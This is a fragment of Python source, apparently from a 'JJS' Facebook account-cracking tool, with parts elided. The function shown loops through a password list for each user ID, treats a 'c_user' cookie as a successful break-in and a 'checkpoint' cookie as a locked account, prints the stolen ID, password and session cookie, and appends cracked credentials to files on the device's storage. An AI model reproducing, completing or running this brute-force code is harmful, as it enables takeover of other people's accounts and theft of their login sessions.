...
def fuck():
    ...
    print(' [+] OK Ids saved in JJS/OK.txt')
    print(' [+] CP Ids saved in JJS/CP.txt')
    print('==================================================')
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[JJS]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[JJS-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/JJS/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[JJS-CP] {cid}|{ps}")
                open('/sdcard/JJS-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
